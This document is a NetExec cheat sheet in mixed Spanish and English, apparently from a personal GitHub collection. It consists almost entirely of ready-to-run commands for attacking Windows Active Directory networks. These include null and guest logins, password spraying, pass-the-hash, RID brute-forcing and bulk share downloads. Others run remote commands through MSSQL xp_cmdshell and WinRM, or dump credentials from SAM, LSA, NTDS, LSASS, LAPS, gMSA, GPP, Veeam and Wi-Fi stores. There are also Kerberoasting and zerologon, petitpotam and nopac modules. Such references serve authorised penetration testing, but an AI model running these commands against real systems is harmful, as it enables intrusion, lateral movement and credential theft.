# NetExec Cheat Sheet


## Authentication

#### Null Authentication
```
netexec smb <IP-TARGET> -u '' -p ''

netexec smb <IP-TARGET> -u 'null' -p ''
```

#### Guest Authentication
```
netexec smb <IP-TARGET> -u 'guest' -p ''
```

#### Local Authentication
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> --local-auth

netexec smb <IP-TARGET> -u '<USERNAME>' -H '<HASH-NTLM>' --local-auth
```

#### SMB con credenciales a dominio WORKGROUP
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -d WORKGROUP
```

#### Kerberos Authentication
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> -k

netexec ldap <IP-TARGET> --use-kcache
```

#### SMB Signing
```
netexec smb <IP-TARGETS> --gen-relay-list relay.txt
```

#### SMB con credenciales y especificando a un puerto
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --port <PORT>
```

## Enumeration

####  Enumeración Básica
```
netexec smb <IP-TARGET>
```

#### Listar equipos dentro de la red de un AD
```
netexec smb 192.168.1.0/24
```

#### Listar Shares
```
netexec smb <IP-TARGET> -u '' -p '' --shares

netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> --shares

netexec smb <IP-TARGET> -u <USERNAME> -H <HASH-NTLM> --shares
```

#### Spraying
```
netexec smb <IP-TARGET> -u users.txt -p <PASSWORD> --continue-on-success

#### Ataque lineal
netexec smb <IP-TARGET> -u users.txt -p passwords.txt --no-brutefoce --continue-on-success

#### Spraying Attack usando HashNTLM
netexec smb <IP-TARGET> -u users.txt -H '<HASH-NTLM>'
```

## Service-Specific

### SMB

#### All-in-One
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
```

#### Enumeración de los usuarios del Directorio Activo
```
netexec smb <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' --users
```

#### Enumeración de los grupos del Directorio Activo
```
netexec smb <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' --groups
```

#### Enumeración de los usarios logueados actualmente
```
netexec smb <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' --loggedon-users
```

#### Enumeración de los grupos locales
```
netexec smb <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' --local-group
```

#### Obtener la politica de contraseñas del AD
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --pass-pol
```

#### Enumeración de usuario (Fuerza Bruta) por RID (RID Cycling Attack)
```
netexec smb <IP-ADDRESS> -u 'guest' -p '' --rid-brute
```

#### Descargar un archivo de un directorio compartido
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> --share <DIRECTORY-NAME> --get-file <FILE-NAME> <OUTPUT-NAME> 
```

#### Descargar todos los archivos que contenga el servidor y guardarlos en un archivo JSON
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M spider_plus
```

#### Descargar todos los archivos que contenga el servidor
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M spider_plus -o DOWNLOAD_FLAG=True
```

#### Descargar todos los archivos que no contenga solo lectura en el servidor
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M spider_plus -o READ_ONLY=false
```

#### Generar archivo Hosts
```
netexec smb <IP-TARGET> --generate-hosts-file <OUTPUT-NAME>
```

#### Generar archivo krb5
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> --generate-krb5-file <OUTPUT-NAME>
```

#### Enviar un archivo de un directorio compartido
```
netexec smb <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE-NAME> \\Windows\\Temp\\<OUTPUT-NAME>
```

### LDAP

#### Mostrar el Identificador de seguridad (SID) del dominio
```
netexec ldap <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' --get-sid
```

#### All-in-One
```
netexec ldap <IP-TARGET> -u <USERNAME> -p <PASSWORD> --trusted-for-delegation --password-not-required --admin-count --users --groups
```

#### Enumeración de usuarios
```
netexec ldap <IP-TARGET> -u '' -p '' --users
```

#### Enumeración de los usuarios activos (no muestra los deshabilitados) del Directorio Activo
```
netexec ldap <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' --active-users
```

#### Enumeración de las cuentas con privilegios elevados, como los administradores de dominio, comprobando el atributo AdminCount
```
netexec ldap <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' --admin-count
```

#### Enumerar los grupos a los que pertenece un usuario específico
```
netexec ldap <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' -M groupmembership -o USER="<USER>"
```

#### Enumerar los usuarios a los que pertenece un grupo en específico
```
netexec ldap <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' -M group-mem -o GROUP="<GROUP-NAME>"
```

#### Obtener la politica de contraseñas del AD
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M pso
```

#### Kerberoasting & ASREProast
```
netexec ldap <IP-TARGET> -u <USERNAME> -p <PASSWORD> --kerberoasting hash.txt

netexec ldap <IP-TARGET> -u <USERNAME> -p <PASSWORD> --asreproast hash.txt
```

#### BloodHound
```
netexec ldap <IP-TARGET> -u <USERNAME> -p <PASSWORD> --bloodhound --dns-server <IP> --dns-tcp -c all
```

#### Comprobar si la firma y la vinculación LDAP son obligatorias y/o se aplican
```
netexec ldap <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M ldap-checker
```

#### Enumeración ADCS
```
netexec ldap <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M adcs
```

#### Mostrar la cuota de creación de cuentas de equipo en Active Directory, lo que puede ser útil para identificar posibles oportunidades de crear equipos fraudulentos o eludir políticas de grupo.
```
netexec ldap <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' -M maq
```

#### identificar las cuentas de ordenador precreadas que podrían utilizarse para eludir los controles de seguridad o crear máquinas fraudulentas en la red
```
netexec ldap <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' -M pre2k
```

#### Find Misconfigured Delegation
```
netexec ldap <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
```

### MSSQL

#### Authentication
```
netexec mssql <IP-TARGET> -u <USERNAME> -p <PASSWORD>
```

#### Ejecutar comandos via xp_cmdshell
```
netexec mssql <IP-TARGET> -u <USERNAME> -p <PASSWORD> -x <COMMAND-TO-EXECUTE>
```

#### Extraer archivos
```
netexec mssql <IP-TARGET> -u <USERNAME> -p <PASSWORD> --get-file <OUTPUT-NAME> <TARGET-FILE>
```

#### FTP

#### Listar archivos y directorios
```
netexec ftp <IP-TARGET> -u <USERNAME> -p <PASSWORD> --ls

netexec ftp <IP-TARGET> -u <USERNAME> -p <PASSWORD> --ls <FOLDER-NAME>
```

#### Obtener un archivo
```
netexec ftp <IP-TARGET> -u <USERNAME> -p <PASSWORD> --ls <FOLDER-NAME> --get <FILE-NAME>
```

## Credential Dumping

#### Secrets Dump
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> --sam

netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> --lsa
```

#### NTDS
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> --ntds

netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> --ntds vss

netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M ntdsutil
```

#### DPAPI
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> --dpapi
```

#### lsass
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M lsassy
```

#### LAPS - Recupera la contraseña LAPS de las cuentas de administrador local
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> --laps
```

#### gMSA
```
netexec ldap <IP-TARGET> -u <USERNAME> -p <PASSWORD> --gmsa

netexec ldap <IP-TARGET> -u <USERNAME> -p <PASSWORD> --gmsa-convert-id <ID>

netexec ldap <IP-TARGET> -u <USERNAME> -p <PASSWORD> --gmsa-decrypt-lsa <gMSA-ACCOUNT>
```

#### Group Policy Preferences
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M gpp_password
```

#### Retrieve MSOL account password
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M msol
```

#### Chaining Arguments
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> --sam --lsa --dpapi
```

## Vulnerabilities

#### Si el DC es vulnerable a zerologon, petitpotam, nopac
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M zerologon

netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M petitpotam

netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M nopac
```

## Useful Modules

### Webdav

#### Comprueba si el servicio WebClient se está ejecutando en el destino
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M webdav
```

### Veeam

#### Extrae las credenciales de la base de datos SQL local de Veeam
```
netexec smb <IP-TARGET> -u <USERNAME> -p <PASSWORD> -M veeam
```

### backup_operator

#### Elevar Privilegios cuando el usuario pertenece al grupo "Backup Operators" para extraer datos NTDS
```
netexec smb <IP-TARGET> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator
```




#### Dumpear de forma remota el contenido de LSASS utilizando la herramienta NanoDump
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M nanodump
```

#### Dumping WIFI Password
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M wireless
```

#### Ver información sobre la red y subredes del equipo
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-network
```

#### Obtener las descripciones de los usuarios de LDAP
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M user-desc
```

#### Obtener las descripciones más detalladas de los usuarios de LDAP
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-desc-users
```

#### Obtener la contraseña de algun usuario
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-userPassword
```

#### Obtener la contraseña de algun usuario en los sistemas basados en Unix
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-unixUserPassword
```

#### Lectura DACL (Discretionary Access Control List) se utiliza para ver las listas de control de acceso de objetos específicos de AD, lo que puede ayudar a identificar accesos excesivamente permisivos o configuraciones erróneas
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --kdcHost <DOMAIN> -M daclread -o TARGET=Administrator ACTION=read
```

#### Ejecutar comando Whoami
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M whoami
```

#### Ejecutar comando Powershell
```
netexec winrm <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -C '<COMMAND>'
```

#### Enumerar las relaciones de confianza entre diferentes dominios, lo que puede ser útil para el movimiento lateral y para atacar dominios interconectados
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M enum_trusts
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)